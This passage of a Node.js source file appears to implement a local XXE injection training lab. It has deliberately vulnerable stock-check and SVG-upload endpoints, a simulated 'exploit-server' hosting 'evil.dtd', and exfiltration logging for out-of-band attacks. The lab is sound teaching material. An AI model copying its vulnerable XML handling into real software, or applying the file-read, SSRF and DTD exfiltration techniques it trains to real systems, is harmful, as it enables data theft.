            document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', ['attack','exploit','oob'][i]===name));
            ['tab-attack','tab-exploit','tab-oob'].forEach(id => document.getElementById(id).style.display = id.endsWith(name) ? '' : 'none');
          }
          async function sendPayload() {
            const xml = document.getElementById('xmlPayload').value;
            const resp = await fetch('${lab.endpoint}', { method: 'POST', headers: {'Content-Type':'text/xml'}, body: xml });
            const text = await resp.text();
            document.getElementById('response').className = 'response-box ' + (resp.ok ? '' : 'error');
            document.getElementById('response').textContent = text;
            refreshOob();
          }
          async function storeDtd() {
            const dtd = document.getElementById('dtdContent').value;
            const resp = await fetch('/exploit-server/dtd', { method: 'POST', headers: {'Content-Type':'text/plain'}, body: dtd });
            document.getElementById('storeStatus').textContent = await resp.text();
          }
          async function refreshOob() {
            const resp = await fetch('/oob-log');
            const data = await resp.json();
            const el = document.getElementById('oobLog');
            if (!data.length) { el.innerHTML = '<span class="empty">No interactions yet.</span>'; return; }
            el.innerHTML = data.map(d => \`<div class="entry">\${d.time} — \${d.type}: \${d.url || d.entity || ''}\${d.data ? ' DATA=' + d.data : ''}</div>\`).join('');
          }
        </script>`;
    } else {
      // Standard XML payload labs
      const defaultPayload = `<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>`;

      const isXIncludelab = lab.id === 7;
      const inputSection = isXIncludelab
        ? `<p style="font-size:13px;color:#8a94a8;margin-bottom:12px;">Product ID field (your input is embedded into server XML — no DOCTYPE control):</p>
           <input type="text" id="productIdInput" value="1" placeholder="Product ID">
           <button onclick="sendXInclude()">Check Stock</button>`
        : `<p style="font-size:13px;color:#8a94a8;margin-bottom:12px;">XML sent to the stock check endpoint:</p>
           <textarea id="xmlPayload" placeholder="Enter XML payload...">${defaultPayload}</textarea>
           <br><br>
           <button onclick="sendPayload()">Send Payload</button>`;

      const oobSection = (lab.id === 3 || lab.id === 4)
        ? `<p style="font-size:12px;color:#8a94a8;margin-top:16px;">OOB Interaction Log (simulates Burp Collaborator):</p>
           <div class="oob-log" id="oobLog"><span class="empty">No interactions yet.</span></div>
           <button class="secondary" style="margin-top:8px;font-size:12px;" onclick="refreshOob()">Refresh Log</button>`
        : '';

      formHtml = `
        ${inputSection}
        ${oobSection}
        <script>
          async function sendPayload() {
            const xml = document.getElementById('xmlPayload').value;
            const resp = await fetch('${lab.endpoint}', { method: 'POST', headers: {'Content-Type':'text/xml'}, body: xml });
            const text = await resp.text();
            document.getElementById('response').className = 'response-box ' + (resp.ok ? '' : 'error');
            document.getElementById('response').textContent = text;
            ${(lab.id === 3 || lab.id === 4) ? "refreshOob();" : ""}
            if (text.includes('root:x:0:0') || text.includes('FLAG') || text.includes('admin-role') || text.includes('AccessKeyId')) {
              document.getElementById('flag').className = 'flag-box visible';
              document.getElementById('flag').textContent = 'Lab Solved!';
            }
          }
          ${isXIncludelab ? `
          async function sendXInclude() {
            const pid = document.getElementById('productIdInput').value;
            const resp = await fetch('${lab.endpoint}', {
              method: 'POST',
              headers: {'Content-Type':'application/x-www-form-urlencoded'},
              body: 'productId=' + encodeURIComponent(pid) + '&storeId=1'
            });
            const text = await resp.text();
            document.getElementById('response').className = 'response-box ' + (resp.ok ? '' : 'error');
            document.getElementById('response').textContent = text;
            if (text.includes('root:x:0:0') || text.includes('FLAG')) {
              document.getElementById('flag').className = 'flag-box visible';
              document.getElementById('flag').textContent = 'Lab Solved! File read via XInclude.';
            }
          }` : ''}
          ${(lab.id === 3 || lab.id === 4) ? `
          async function refreshOob() {
            const resp = await fetch('/oob-log');
            const data = await resp.json();
            const el = document.getElementById('oobLog');
            if (!data.length) { el.innerHTML = '<span class="empty">No interactions yet.</span>'; return; }
            el.innerHTML = data.map(d => '<div class="entry">' + d.time + ' — ' + d.type + ': ' + (d.url||d.entity||'') + '</div>').join('');
          }` : ''}
        </script>`;
    }

    const body = `
      <nav><a href="/">← Back to Dashboard</a></nav>
      <div class="lab-page">
        <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
          <span style="color:#666;font-size:13px;">LAB ${lab.id}</span>
          <span class="badge ${lab.difficultyClass}">${lab.difficulty}</span>
        </div>
        <h2>${lab.title}</h2>
        <p style="margin-top:8px;font-size:14px;color:#8a94a8;">${lab.description}</p>

        <div class="objective"><strong>Objective:</strong> ${lab.objective}</div>
        <div class="background">${lab.background}</div>

        <hr>
        ${formHtml}

        <div class="response-box" id="response" style="margin-top:20px;">Response will appear here...</div>
        <div class="flag-box" id="flag"></div>

        <hr>
        <div class="hint-box">
          <strong>Hint:</strong> ${lab.hint}
        </div>

        <button class="secondary" style="margin-top:16px;" onclick="toggleSolution()">Show Solution</button>
        <div class="solution-box" id="solutionBox">
          ${lab.solution}
        </div>
      </div>
      <script>
        function toggleSolution() {
          const box = document.getElementById('solutionBox');
          const btn = box.previousElementSibling;
          const show = !box.classList.contains('visible');
          box.classList.toggle('visible', show);
          btn.textContent = show ? 'Hide Solution' : 'Show Solution';
        }
      </script>`;

    res.send(page(`Lab ${lab.id}`, body));
  });
});

// ─── API: Exploit server DTD storage ──────────────────────────────────────

app.post('/exploit-server/dtd', (req, res) => {
  exploitDtd = req.body || '';
  res.send('DTD stored successfully at http://exploit-server.local/evil.dtd');
});

app.get('/exploit-server/evil.dtd', (req, res) => {
  res.type('text/plain').send(exploitDtd);
});

// ─── API: OOB interaction log ──────────────────────────────────────────────

app.get('/oob-log', (req, res) => {
  res.json(oobLog.slice(-50));
});

app.delete('/oob-log', (req, res) => {
  oobLog.length = 0;
  res.json({ cleared: true });
});

// ─── Lab 1: XXE file retrieval ────────────────────────────────────────────

app.post('/lab1/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  const parsed = parseXmlVulnerable(xml);
  if (parsed.error) return res.status(400).send(parsed.error);

  const pid = parsed.productId;
  if (!pid) return res.status(400).send('Missing productId element');

  // If file contents were injected into productId, reflect them in the error
  if (pid.includes('root:') || pid.includes(':x:') || pid.includes('www-data') || pid.includes('FLAG')) {
    return res.status(400).send(`Invalid productId: ${pid}`);
  }

  const numId = parseInt(pid, 10);
  if (isNaN(numId) || numId < 1 || numId > 5) {
    return res.status(400).send(`Invalid productId: ${pid}`);
  }

  res.send(`{ "product": ${numId}, "store": ${parsed.storeId || 1}, "units": ${Math.floor(Math.random() * 200) + 10} }`);
});

// ─── Lab 2: XXE SSRF ──────────────────────────────────────────────────────

app.post('/lab2/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  const parsed = parseXmlVulnerable(xml);
  if (parsed.error) return res.status(400).send(parsed.error);

  const pid = parsed.productId;
  if (!pid) return res.status(400).send('Missing productId element');

  // Reflect SSRF response
  if (pid.includes('admin-role') || pid.includes('ami-id') || pid.includes('AccessKeyId') || pid.includes('instance')) {
    return res.status(400).send(`Invalid productId: ${pid}`);
  }

  const numId = parseInt(pid, 10);
  if (isNaN(numId) || numId < 1 || numId > 5) {
    return res.status(400).send(`Invalid productId: ${pid}`);
  }

  res.send(`{ "product": ${numId}, "store": ${parsed.storeId || 1}, "units": ${Math.floor(Math.random() * 200) + 10} }`);
});

// ─── Lab 3: Blind XXE OOB ─────────────────────────────────────────────────

app.post('/lab3/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  // Parse but never reflect entity values
  parseXmlVulnerable(xml);

  res.send('There are 42 units available.');
});

// ─── Lab 4: Blind XXE via parameter entities ──────────────────────────────

app.post('/lab4/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  // Simulate: block regular entity SYSTEM declarations
  if (/<!ENTITY\s+\w+\s+SYSTEM/.test(xml)) {
    return res.status(400).send('External entity declarations are not permitted.');
  }

  // Allow parameter entities
  parseXmlVulnerable(xml);

  res.send('There are 42 units available.');
});

// ─── Lab 5: Blind XXE exfiltration via external DTD ──────────────────────

app.post('/lab5/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  // Simulate loading external DTD and processing it
  const externalDtdMatch = xml.match(/SYSTEM\s+"(http:\/\/exploit-server\.local\/[^"]+)"/);
  if (externalDtdMatch && exploitDtd) {
    // Process the DTD - look for file entity + exfiltrate pattern
    const fileMatch = exploitDtd.match(/SYSTEM\s+"file:\/\/([^"]+)"/);
    const exfilMatch = exploitDtd.match(/SYSTEM\s+'http:\/\/([^?']+)\?x=%file;'/);

    if (fileMatch && exfilMatch) {
      const filePath = fileMatch[1];
      const fileContent = resolveFile(filePath) || resolveFile('/' + filePath) || '[not found]';
      const exfilUrl = `http://${exfilMatch[1]}?x=${encodeURIComponent(fileContent)}`;
      oobLog.push({
        type: 'HTTP_EXFIL',
        url: exfilUrl,
        data: fileContent.substring(0, 200),
        time: new Date().toISOString(),
      });
    } else {
      // Error-based pattern
      const errFileMatch = exploitDtd.match(/SYSTEM\s+"file:\/\/([^"]+)"/);
      if (errFileMatch) {
        const filePath = errFileMatch[1];
        const fileContent = resolveFile(filePath) || resolveFile('/' + filePath) || '[not found]';
        return res.status(500).send(`XML parsing error: java.io.FileNotFoundException: /nonexistent/${fileContent.split('\n')[0]}`);
      }
    }
  }

  res.send('There are 42 units available.');
});

// ─── Lab 6: Blind XXE error-based ─────────────────────────────────────────

app.post('/lab6/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  const externalDtdMatch = xml.match(/SYSTEM\s+"(http:\/\/exploit-server\.local\/[^"]+)"/);
  if (externalDtdMatch && exploitDtd) {
    const fileMatch = exploitDtd.match(/SYSTEM\s+"file:\/\/([^"]+)"/);
    if (fileMatch) {
      const filePath = fileMatch[1];
      const fileContent = resolveFile(filePath) || resolveFile('/' + filePath) || '[not found]';
      return res.status(500).send(
        `java.io.FileNotFoundException: /nonexistent/${fileContent}\n\tat com.example.xml.XmlParser.parse(XmlParser.java:42)\n\tat com.example.stock.StockService.check(StockService.java:18)`
      );
    }
  }

  res.send('There are 42 units available.');
});

// ─── Lab 7: XInclude ──────────────────────────────────────────────────────

app.post('/lab7/stock', (req, res) => {
  const productId = req.body.productId || '';
  const storeId = req.body.storeId || '1';

  // Server embeds user input into XML — attacker cannot control DOCTYPE
  const serverXml = `<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>${productId}</productId>
  <storeId>${storeId}</storeId>
</stockCheck>`;

  // Parse with XInclude support enabled
  const parsed = parseXmlVulnerable(serverXml, { allowXInclude: true });

  if (parsed.xincludeUsed) {
    return res.status(400).send(`Invalid productId: ${parsed.xincludeContent}`);
  }

  const numId = parseInt(productId, 10);
  if (isNaN(numId) || numId < 1 || numId > 5) {
    return res.status(400).send(`Invalid productId: ${productId}`);
  }

  res.send(`{ "product": ${numId}, "store": ${storeId}, "units": ${Math.floor(Math.random() * 200) + 10} }`);
});

// ─── Lab 8: SVG file upload ───────────────────────────────────────────────

app.post('/lab8/upload', upload.single('avatar'), (req, res) => {
  if (!req.file) return res.status(400).send('No file uploaded.');

  const filePath = req.file.path;
  let fileContent;
  try {
    fileContent = fs.readFileSync(filePath, 'utf-8');
  } catch {
    return res.status(500).send('Failed to read uploaded file.');
  } finally {
    try { fs.unlinkSync(filePath); } catch {}
  }

  // Check if SVG/XML
  if (!fileContent.trim().startsWith('<')) {
    return res.status(400).send('Invalid file format. Please upload an SVG file.');
  }

  // Vulnerable: parse uploaded SVG as XML and resolve entities
  const parsed = parseXmlVulnerable(fileContent);

  // Look for entity-resolved text content to render
  const textMatch = fileContent.match(/<text[^>]*>([^<]*)<\/text>/);
  let renderedText = textMatch ? textMatch[1].trim() : '';

  // Substitute resolved entities
  for (const [name, value] of Object.entries({})) {
    renderedText = renderedText.replace(`&${name};`, value);
  }

  // Extract xxe entity value from parsed XML body
  const entityMatch = fileContent.match(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"file:\/\/([^"]+)"\s*>/);
  if (entityMatch) {
    const filePath2 = entityMatch[2];
    const fileData = resolveFile(filePath2) || resolveFile('/' + filePath2);
    if (fileData) {
      return res.send(`Avatar uploaded. Rendered content:\n\n${fileData}`);
    }
  }

  res.send(`Avatar uploaded successfully. Rendered: ${renderedText || '(empty SVG)'}`);
});

// ─── Lab 9: Repurpose local DTD ───────────────────────────────────────────

const LOCAL_DTDS = {
  '/usr/share/yelp/dtd/docbookx.dtd': `<!-- DocBook XML DTD (simulated) -->
<!ENTITY % ISOamsa PUBLIC "ISO 8879:1986//ENTITIES Added Math Symbols: Arrow Relations//EN//XML" "isoamsa.ent">`,
  '/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd': `<!-- DocBook 4.5 (simulated) -->
<!ENTITY % ISOamsa "">`,
};

app.post('/lab9/stock', (req, res) => {
  const xml = req.body;
  if (!xml || typeof xml !== 'string') return res.status(400).send('Expected XML body');

  // Block ALL outbound connections
  if (/SYSTEM\s+"https?:\/\//.test(xml)) {
    return res.status(400).send('Outbound connections blocked by security policy.');
  }

  // Allow loading local DTD files
  const localDtdMatch = xml.match(/SYSTEM\s+"file:\/\/([^"]+\.dtd)"/);
  if (localDtdMatch) {
    const dtdPath = localDtdMatch[1];
    if (!LOCAL_DTDS['/' + dtdPath] && !LOCAL_DTDS[dtdPath]) {
      return res.status(500).send(`java.io.FileNotFoundException: /${dtdPath} (No such file or directory)`);
    }

    // Simulate: check if ISOamsa is being redefined (exploit)
    const isoAmsaRedefineMatch = xml.match(/<!ENTITY\s+%\s+ISOamsa\s+'([^']+)'/s);
    if (isoAmsaRedefineMatch) {
      const entityBody = isoAmsaRedefineMatch[1];
      const fileMatch = entityBody.match(/SYSTEM\s+"file:\/\/([^"]+)"/);
      if (fileMatch) {
        const filePath = fileMatch[1];
        const fileContent = resolveFile(filePath) || resolveFile('/' + filePath) || '[not found]';
        return res.status(500).send(
          `java.io.FileNotFoundException: /nonexistent/${fileContent}\n\tat com.example.xml.XmlParser.parse(XmlParser.java:42)`
        );
      }
    }
  }

  // Normal parse (no outbound)
  const parsed = parseXmlVulnerable(xml, { blockOutbound: true });
  if (parsed.error) return res.status(400).send(parsed.error);

  res.send('There are 42 units available.');
});

// ─── Start ─────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`\n  XXE Injection Labs running at http://localhost:${PORT}\n`);
  console.log('  Labs:');
  labs.forEach(lab => {
    console.log(`    Lab ${lab.id} [${lab.difficulty}]: ${lab.title}`);
  });
  console.log('');
});
